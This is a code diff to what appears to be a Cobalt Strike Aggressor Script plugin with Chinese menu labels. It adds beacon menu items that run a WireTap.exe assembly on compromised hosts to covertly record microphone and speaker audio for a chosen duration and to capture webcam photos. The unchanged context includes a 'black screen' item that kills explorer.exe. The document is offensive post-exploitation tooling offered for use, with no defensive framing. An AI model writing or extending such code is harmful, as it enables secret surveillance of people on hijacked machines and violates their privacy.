@@ -32,6 +32,32 @@ sub Send {
             }, @ids => $1));
         }
 
+			item "录音" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(time => "30s",bid => $bid), &WireTap_listen);
+			dialog_description($dialog, "record_mic-录制来自连接的麦克风的音频（输入）,record_sys-录制来自系统扬声器的音频（线路输出）,record_audio-记录来自麦克风和扬声器的音频,时间单位为s / m / h。example: record_audio 30s");
+			drow_combobox($dialog, "type", "type:", @("record_mic","record_sys","record_audio"));
+			drow_text($dialog, "time", "time:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub WireTap_listen {
+	$arg = join(' ',  @($3['type'],$3['time']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+			item "拍照" {
+			$bid = $1['@'];
+			$dialog = dialog("WireTap", %(bid => $bid), &WireTap_webcam);
+			dialog_description($dialog, "开启摄像头拍照。");	
+			drow_combobox($dialog, "type", "type:", @("capture_webcam"));			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub WireTap_webcam {
+	$arg = join(' ',  @($3['type']));
+	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
+}	
+
                 item "黑屏"{
                     bshell($1,"taskkill /F /IM explorer.exe");
                 }
